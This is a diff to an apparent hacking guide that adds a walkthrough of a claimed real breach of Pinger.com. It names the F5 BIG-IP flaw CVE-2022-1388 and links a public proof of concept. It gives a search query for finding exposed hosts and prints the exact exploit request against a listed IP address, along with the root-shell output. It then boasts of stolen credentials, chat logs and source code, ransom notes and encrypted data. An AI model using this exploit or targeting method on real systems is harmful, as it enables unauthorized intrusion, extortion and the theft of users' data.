@@ -72,6 +72,83 @@ Important: All content is provided for educational use only. Unauthorized penetr
 - Metasploit Framework (exploit testing)  
 - Python/scripting knowledge (for PoC modification)  
 
+## 2. Walkthroughs (& How Pinger.com Was Breached)
 
+**Note:** I'll give you all the tools I used in these walkthroughs. If you can't find something, message me and I'll help you out.
 
-I am actively completing this ...
+### Walkthrough 1: How We Got Initial Access to Pinger.com
+
+Let me walk you through exactly how we got into Pinger.com step-by-step. Here's what we accomplished:
+- Triggered building security alarms
+- Printed ransom notes on their printers
+- Shut down power to their server room
+- Stole their source code
+- Encrypted their data
+
+#### Step-by-Step Breakdown:
+
+1. **Finding the Exploit**
+   - I was looking for exploits being used in real attacks and found CVE-2022-1388
+   - Searched for it on sploitus.com and found a Proof of Concept (PoC)
+     - Remember: Not all PoCs are complete exploits!
+   - Followed the source link to GitHub:  
+     https://github.com/alt3kx/CVE-2022-1388
+
+2. **Testing the Exploit**
+   - Now we have two options:
+     1. Test it safely on a local VM first (recommended)
+     2. Go straight to finding vulnerable hosts (riskier)
+
+3. **Finding Vulnerable Targets**
+   - This vendor (F5 Big-IP) has special filters:
+     - Censys.io has them but version detection is hard
+     - leakix.net works much better for this case
+   - Try different search engines to see what works best:
+     - fofa
+     - shodan
+     - leakix
+     - censys
+   - Good leakix search query:  
+     https://leakix.net/search?scope=leak&q=%2Bplugin%3A%22BigIPVersion%22  
+     (This shows all vulnerable F5 Big-IP hosts)
+
+4. **Executing the Exploit**
+   - The PoC uses a POST request - perfect for BurpSuite
+   - Here's the exact request we used:
+     ```http
+     POST /mgmt/tm/util/bash HTTP/1.1
+     Host: 207.140.30.115
+     Authorization: Basic YWRtaW46
+     Connection: keep-alive, X-F5-Auth-Token
+     X-F5-Auth-Token: 0
+     Content-Length: 100
+
+     {"command": "run", "utilCmdArgs": " -c 'id' "}
+     ```
+   - Here's how we did it:
+     1. Opened BurpSuite
+     2. Sent a normal GET request to the Repeater
+     3. Changed it to the POST request above
+     4. Hit send
+
+5. **Confirming We Got In**
+   - The server responded with:
+     ```json
+     {
+       "kind": "tm:util:bash:runstate",
+       "command": "run",
+       "utilCmdArgs": " -c 'id' ",
+       "commandResult": "uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\n"
+     }
+     ```
+   - Boom! We have root access (RCE).
+
+6. **What We Did After Getting In**
+   - Set up SSH port forwarding (port 8081)
+   - Compromised multiple Jenkins servers
+   - Accessed terabytes of data including:
+     - Plain text chat logs
+     - Usernames and passwords
+     - System logs
+     - Complete source code
+   - Fun fact: Pinger owns TextFree - the biggest free phone number app in North America!
